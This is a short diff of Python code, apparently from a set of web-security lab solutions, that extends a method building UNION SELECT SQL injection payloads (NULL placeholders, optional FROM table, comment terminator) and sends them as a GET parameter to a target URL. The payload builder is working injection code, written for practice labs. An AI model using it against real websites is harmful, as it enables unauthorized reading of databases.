@@ -9,11 +9,15 @@ class Lab(lab_03.Lab):
     """Wrapper"""
 
     # pylint: disable=too-many-arguments
-    def column_is_string_type(self, column: int, text: str = "a") -> bool:
+    def column_is_string_type(self, column: int, text: str = "a",
+                              table: str = "") -> bool:
         """Column index contains text"""
-        nulls = ["NULL"] * self.column_count()
+        nulls = ["NULL"] * self.column_count(table=table)
         nulls[column] = f"'{text}'"
-        query = "'+UNION+SELECT+{}--".format(",".join(nulls))
+        if table:
+            table = f"+FROM+{table}"
+        query = "'+UNION+SELECT+{}{}{}".format(",".join(nulls), table,
+                                               self.comment)
         payload = {self.key: query}
         payload_str = "&".join("%s=%s" % (k, v) for k, v in payload.items())
         response = self.session.get(self.url + self.path, params=payload_str)
